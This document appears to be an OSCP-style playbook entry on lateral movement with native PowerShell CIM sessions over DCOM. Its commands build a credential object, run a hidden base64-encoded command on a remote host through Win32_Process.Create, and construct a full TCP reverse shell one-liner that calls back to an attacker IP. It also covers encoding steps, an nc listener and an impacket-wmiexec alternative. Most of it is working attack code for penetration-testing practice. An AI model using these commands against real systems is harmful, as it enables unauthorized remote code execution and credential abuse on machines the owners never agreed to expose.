title: WMI / CIM Lateral Movement — Native PowerShell, No Impacket
body:
You're on a Windows foothold (say as jeff) and you have a credential for another user (say jen) who's local admin on a remote box. You want a shell there, but you're NOT on Kali — you can't reach for impacket-wmiexec. This is the living-off-the-land version: spawn a process on the remote host using only built-in PowerShell, over WMI via a CIM session.

WHY THIS MATTERS ON OSCP:
  - No tools to drop. Get-CimInstance / New-CimSession ship with Windows. AV is far less likely to flag native cmdlets than a dropped wmiexec binary.
  - Works from a foothold when you can't easily tunnel SMB/WinRM back to Kali.
  - DCOM transport (port 135 + dynamic RPC) is often open between domain hosts even when 5985/WinRM is filtered.

HOW IT WORKS (the screenshot chain):
  1. Build a PSCredential object for the user whose creds you have (jen)
  2. Create a CIM session to the target over DCOM with those creds
  3. Call Win32_Process.Create via Invoke-CimMethod to spawn a process — typically an encoded PowerShell reverse shell

The -EncodedCommand (-e) blob is a base64'd, UTF-16LE PowerShell payload (usually a reverse shell). Win32_Process.Create runs it on the REMOTE host in the context of the creds you supplied. You get a callback on your listener.

KEY DETAIL — no output comes back:
Win32_Process.Create is fire-and-forget. It returns a ProcessId and a ReturnValue (0 = success), NOT the command's output. That's why you pair it with a reverse shell, not a 'whoami'. If you want output-returning exec, use impacket-wmiexec from Kali instead — but that's not always reachable from a foothold.

DCOM vs WinRM:
  - This uses -Protocol DCOM (port 135). Use when WinRM is filtered.
  - Drop -SessionOption to default to WSMan/WinRM (5985) instead.

This is the same enum-loop lesson: you got jen's cred from somewhere (spray, roast, mimikatz), and now you USE it to move. After landing the shell, re-enumerate as the new context.
cmd:
# ══════════════════════════════════════════════════
# NATIVE CIM/DCOM LATERAL MOVEMENT (run FROM a Windows foothold)
# ══════════════════════════════════════════════════
# Context: you are jeff, you have jen's creds, jen is admin on 192.168.50.73.

# 1) Build the credential object
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# 2) CIM session over DCOM (port 135) — use when WinRM/5985 is filtered
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

# 3) Spawn a process on the remote host via Win32_Process.Create
#    $Command is a base64 (UTF-16LE) encoded PowerShell reverse shell — see below
$Command = 'powershell -nop -w hidden -e <BASE64_REVSHELL>'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}

# ReturnValue 0 = success. You get a ProcessId, NOT output. Catch the shell on your listener.

# ══════════════════════════════════════════════════
# BUILDING THE ENCODED REVERSE SHELL PAYLOAD
# ══════════════════════════════════════════════════
# On Kali — make the PS reverse shell one-liner, then base64-UTF16LE encode it.
# Classic Nishang/one-liner TCP reverse shell, replace IP/PORT:
LHOST=192.168.49.X; LPORT=443
SHELL='$client = New-Object System.Net.Sockets.TCPClient("'$LHOST'",'$LPORT');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# Encode it (PowerShell wants UTF-16LE then base64):
echo -n "$SHELL" | iconv -t UTF-16LE | base64 -w 0
# Paste the result after  powershell -nop -w hidden -e

# Start your listener BEFORE firing:
nc -lvnp 443
# or: rlwrap nc -lvnp 443   (better shell ergonomics)

# ══════════════════════════════════════════════════
# CLEANUP / NOTES
# ══════════════════════════════════════════════════
# Tear down the CIM session when done:
Remove-CimSession -CimSession $Session

# If WinRM IS available, drop -SessionOption to use WSMan (often more reliable):
#   $Session = New-CimSession -ComputerName <ip> -Credential $credential

# Output-returning alternative (from KALI, not a foothold):
#   impacket-wmiexec corp.com/jen:'Nexus123!'@192.168.50.73
# That gives a semi-interactive shell with output — but needs Kali reachability.

# ══════════════════════════════════════════════════
# TOOLKIT — invoke_cmd.ps1 (parameterized, hardened)
# ══════════════════════════════════════════════════
# The oscp-toolkit repo has this wrapped as a reusable script with
# error handling, ReturnValue decoding, and guaranteed session cleanup.
# Copy it to your Windows foothold and run:
#   .\invoke_cmd.ps1 -Target 192.168.50.73 -Username jen -Password 'Nexus123!' \
#       -Command 'powershell -nop -w hidden -e <BASE64_REVSHELL>'
# Force WinRM instead of DCOM:  add  -Protocol Wsman
# Source: github.com/Jimi421/oscp-toolkit  (tools/invoke_cmd.ps1)
warn: Win32_Process.Create returns a ProcessId and ReturnValue, NOT command output — pair it with a reverse shell, not a one-shot command you expect to read. Make sure your listener is running before you invoke the method, or the callback is lost.

choices.label: Got a shell — enumerate as the new context
Need other lateral movement methods (impacket, WinRM)
Have a hash not a password — pass-the-hash
Need a reverse shell payload / listener setup
On the target — dump creds with mimikatz
